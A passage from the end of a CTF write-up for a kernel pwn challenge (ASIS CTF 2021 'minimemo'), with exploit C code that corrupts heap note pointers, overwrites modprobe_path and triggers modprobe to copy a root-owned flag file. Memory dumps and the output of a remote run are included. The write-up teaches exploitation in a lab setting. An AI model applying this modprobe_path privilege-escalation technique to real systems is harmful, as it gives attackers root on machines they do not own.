+    <span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">donew</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">((</span><span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8c</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Good key: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">dodel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Overwrite fd lsb</span>
+<span class="n">doedit</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mh">0x15</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
+<span class="n">lptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="p">(</span><span class="o">*</span><span class="n">lptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>                    <span class="c1">// new note id</span>
+<span class="p">(</span><span class="o">*</span><span class="n">lptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">modprobe</span> <span class="o">-</span> <span class="mh">0x10</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span>      <span class="c1">// fd =&gt; modprobe_path</span>
+
+<span class="n">doedit</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x8</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span></code></pre></figure>
+
+<p>So, again, we recreate the note until the lsb of <code class="language-plaintext highlighter-rouge">id</code> has a good value (<code class="language-plaintext highlighter-rouge">0x8c</code> in this case). We’ll use it again to overwrite the <code class="language-plaintext highlighter-rouge">fd</code> to make it point into the note itself (this fake chunk will have <code class="language-plaintext highlighter-rouge">id 0x0</code> for now).</p>
+
+<p>And we then edit this fake chunk, to overwrite the id with something <code class="language-plaintext highlighter-rouge">!= 0x0</code> and let the <code class="language-plaintext highlighter-rouge">fd</code> point slightly above <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e93880:	0x000000002145278c	0x0000000000000000  &lt;= note 4 (id lsb 0x8c)
+0xffff888002e93890:	0x0000000000000000	0xffff888002e938c0  &lt;= note 4 fd
+0xffff888002e938a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e938b0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>After overwriting <code class="language-plaintext highlighter-rouge">fd</code> lsb</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e93880:	0x000000002145278c	0x0000000000000000  &lt;= note 4
+0xffff888002e93890:	0x0000000000000000	0xffff888002e9388c  &lt;= note 4 id 0x0 / note 4 fd (=&gt; note + 0xc)
+0xffff888002e938a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e938b0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>After editing the fake note (id 0x0)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e93880:	0x000000002145278c	0x0000000000000000  &lt;= note 4
+0xffff888002e93890:	0x0000000000000001	0xffffffff81e367b4  &lt;= note 4 id 0x1 / note 4 fd (=&gt; modprobe path)
+0xffff888002e938a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e938b0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Everything prepared, we can now just overwrite <code class="language-plaintext highlighter-rouge">modprobe_path</code> and do the “usual” modprobe copy flag exploit :)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /root/flag.txt /tmp/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /tmp/flag' &gt; /tmp/c"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/c"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /tmp/dummy"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/dummy"</span><span class="p">);</span>
+
+<span class="p">...</span>
+
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+<span class="n">strcpy</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="s">"/tmp/c"</span><span class="p">);</span>
+
+<span class="c1">// overwrite modprobe_path with /tmp/c</span>
+<span class="n">doedit</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
+<span class="n">system</span><span class="p">(</span><span class="s">"/tmp/dummy"</span><span class="p">);</span>      <span class="c1">// trigger modprobe copy</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"cat /tmp/flag"</span><span class="p">);</span></code></pre></figure>
+
+<p>As always, my initial exploit didn’t work remote, so I had to completely rewrite it (like shown in this writeup).</p>
+
+<p>But still, it was a little bit off on remote, so I had to allocate an additional <code class="language-plaintext highlighter-rouge">0x40</code> chunk at the start to make the exploit work (differed between local and remote execution via <code class="language-plaintext highlighter-rouge">argc</code>, so the exploit has to be run with <code class="language-plaintext highlighter-rouge">pwn 1</code> when running remote).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] Compile
+[+] Opening connection to 168.119.108.148 on port 14010: Done
+[+] Starting local process './pow.py': pid 82506
+Prefix =&gt; RAzo
+[*] Booting
+[+] Upload: Done
+[*] Switching to interactive mode
+$ ./pwn 1
+Good key        : 0x64028ac0
+kernel leak     : 0xffff9d7901a8e900
+modprobe_target : 0xffff9d7901a8e768
+Good key        : 0x2e3d7890
+modprobe leak   : 0xffffffffbf6b27a0
+modprobe        : 0xffffffffbf6367c0
+Good key        : 0x43f32c8c
+/tmp/dummy: line 1: \xff\xff\xff\xff: not found
+ASIS{unl1nk_4tt4ck_1n_k3rn3l-l4nd_1s_5tr0ng!}</code></pre></figure>
+
+<p>That was a very nice and fun challenge (as expected from ptr-yudai ;))</p>
+
+<p>Though from reading the flag, this was maybe not completely the intended way, since I used the unlink just for the initial leak.</p>
+
+<p>In hindsight, doing writes via abusing the <code class="language-plaintext highlighter-rouge">unlink</code> might have been much easier (since there are no checks on <code class="language-plaintext highlighter-rouge">fd</code>/<code class="language-plaintext highlighter-rouge">bk</code>), but even after completely rewriting the exploit after it failed remote, it was still enough for first blood, so… <em>shrug</em> :)</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=asis ctf 2021 - minimemo&amp;url=https://kileak.github.io/ctf/2021/asis21-minimemo/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/asis21-minimemo/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/asis21-minimemo';
+        var disqus_title = 'asis ctf 2021 - minimemo';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/asis21-minimemo';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
